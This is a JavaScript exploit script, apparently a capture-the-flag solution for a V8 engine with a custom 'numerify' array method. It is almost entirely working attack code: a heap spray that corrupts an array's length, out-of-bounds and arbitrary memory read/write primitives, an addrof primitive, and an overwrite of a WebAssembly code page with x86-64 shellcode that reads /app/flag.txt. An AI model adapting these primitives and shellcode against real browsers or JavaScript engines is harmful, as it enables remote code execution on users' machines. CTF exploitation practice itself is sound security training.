var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
         f64_buf[0] = val;
         return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}
function itof(val) {
         u64_buf[0] = Number(val & 0xffffffffn);
         u64_buf[1] = Number(val >> 32n);
         return f64_buf[0];
}
function fto2i(val) {
    f64_buf[0] = val;
    return [u64_buf[0], u64_buf[1]]
}
function _2itof(v1, v2) {
    u64_buf[0] = v1;
    u64_buf[1] = v2;
    return f64_buf[0];
}
function i_to_smi(v) {
    return v << 1;
}
function smi_to_i(v) {
    v >> 1;
}

const FILL_THING = 1.1;
const ARRAY_SIZE = 168;
const ARRAY_SIZE_TWO = 500;
const MAIN_SPRAY_COUNT = 40;
const SPRAY_COUNT = 1024;

class OobArray {
    // Self-overlapping array and offset to the header of the JSArray
    // Next is the array directly after `OobArray`
    constructor(array, offset) {
        this.array = array;
        this.offset = offset;
    }
    get_map_ptr() {
        let [map, _] = fto2i(this.array[this.offset]);
        return map;
    }
    get_elements_ptr() {
        let [elts, _] = fto2i(this.array[this.offset + 1]);
        return elts;
    }
    oob_read(idx) {
        let len = this.array.length;
        let [elts, _] = fto2i(this.array[this.offset + 1]);
        this.array[this.offset + 1] = _2itof(elts, i_to_smi(idx + 1));
        let val = this.array[idx];
        this.array[this.offset + 1] = _2itof(elts, i_to_smi(len));
        return val;
    }
    oob_write(idx, value) {
        let len = this.array.length;
        let [elts, ] = fto2i(this.array[this.offset + 1]);
        this.array[this.offset + 1] = _2itof(elts, i_to_smi(idx + 1));
        this.array[idx] = value;
        this.array[this.offset + 1] = _2itof(elts, i_to_smi(len));
    }
    // read a qword as a float from a compressed pointer
    arb_read(ptr) {
        let [elts, len] = fto2i(this.oob_read(this.offset + 3 + this.offset + 1));
        this.oob_write(this.offset + 3 + this.offset + 1, _2itof(ptr - 8, len));
        let val = this.next[0];
        this.oob_write(this.offset + 3 + this.offset + 1, _2itof(elts, len));
        return val;
    }
    // write a qword as a float to a compressed pointer
    arb_write(ptr, val) {
        let [elts, len] = fto2i(this.oob_read(this.offset + 3 + this.offset + 1));
        this.oob_write(this.offset + 3 + this.offset + 1, _2itof(ptr - 8, len));
        this.next[0] = val;
        this.oob_write(this.offset + 3 + this.offset + 1, _2itof(elts, len));
    }
    addrof(obj) {
        let proto = Object.getPrototypeOf(this.next);
        Object.setPrototypeOf(this.next, obj);
        let [next_map_ptr, ] = fto2i(this.oob_read(this.offset + 3 + this.offset));
        let [addr, ] = fto2i(this.arb_read(next_map_ptr + 16));
        Object.setPrototypeOf(this.next, proto);
        return addr;
    }
}

class EvilBuffer {
    constructor(oob) {
        this.oob = oob;
        this.buf = new ArrayBuffer(0x10000);
    }
    // read a qword as a float from a real pointer
    arb_read(ptr) {
        let ab_addr = this.oob.addrof(this.buf);
        this.oob.arb_write(ab_addr + 0x24, itof(ptr));
        let view = new Float64Array(this.buf);
        return view[0];
    }
    // write a byte array to a real pointer
    arb_write(ptr, bytes) {
        let ab_addr = this.oob.addrof(this.buf);
        this.oob.arb_write(ab_addr + 0x24, itof(ptr));
        let view = new Uint8Array(this.buf);
        for (let i = 0; i < bytes.length; i++) {
            view[i] = bytes[i];
        }
    }
}

function do_overlap() {
    for (let i = 0; i < MAIN_SPRAY_COUNT; i++) {
        let sprayed = [];
        let a = new Array(ARRAY_SIZE);

        // Delete `a` and try to overwrite the `length` of the backing store
        // of one of our newly allocated arrays
        let evil = { [Symbol.toPrimitive]() {
            a = undefined;
            for (let j = 0; j < SPRAY_COUNT; j++) {
                let arr = new Array(ARRAY_SIZE_TWO).fill(FILL_THING);
                arr[0] = j;
                sprayed.push(arr);
            }
            return 0x200;
        }}
        a[ARRAY_SIZE - 1] = evil;
        a.numerify();

        for (let j = 0; j < sprayed.length; j++) {
            // Try and grow the length of the sprayed JSArray into our
            // fake over-large backing store
            let old_len = sprayed[j].length;
            sprayed[j].length = old_len + 4;
            let elts_length = sprayed[j][ARRAY_SIZE_TWO + 1];
            // The backing store of this array hasn't been expanded
            if (elts_length === undefined) continue;
            // Read out the elements pointer and length smi
            let [, length] = fto2i(elts_length);
            // We've overlapped with our own JSArray header
            if (length == i_to_smi(sprayed[j].length)) {
                let oob = new OobArray(sprayed[j], ARRAY_SIZE_TWO);
                let next = oob.oob_read(ARRAY_SIZE_TWO + 3);
                oob.next = sprayed[next];
                return oob;
            }
        }
    }
    return undefined;
}

let corrupted;
console.log("heap spraying, waiting for overlap...");
while (!corrupted) corrupted = do_overlap();

console.log("got corrupted");

var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 9, 1, 5, 115, 104, 101, 108, 108, 0, 0, 10, 4, 1, 2, 0, 11]);
var mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(mod);
var shell = wasm_instance.exports.shell;
for (var i = 0; i < 1024 * 8; i++) shell();
let [, wasm_trused_data] = fto2i(corrupted.arb_read(corrupted.addrof(wasm_instance) + 8));
let code_ptr = ftoi(corrupted.arb_read(wasm_trused_data + 0x30));

console.log("code_ptr: 0x" + code_ptr.toString(16));

// sendfile(1, open("/app/flag.txt"), ...)
let shellcode = [0x48, 0xb8, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x50, 0x48, 0xb8, 0x66, 0x2f, 0x75, 0x79, 0x75, 0x1, 0x1, 0x1, 0x48, 0x31, 0x4, 0x24, 0x48, 0xb8, 0x2f, 0x61, 0x70, 0x70, 0x2f, 0x66, 0x6c, 0x61, 0x50, 0x6a, 0x2, 0x58, 0x48, 0x89, 0xe7, 0x31, 0xf6, 0x99, 0xf, 0x5, 0x41, 0xba, 0xff, 0xff, 0xff, 0x7f, 0x48, 0x89, 0xc6, 0x6a, 0x28, 0x58, 0x6a, 0x1, 0x5f, 0x99, 0xf, 0x5];

let eb = new EvilBuffer(corrupted);
eb.arb_write(code_ptr, shellcode);
shell();
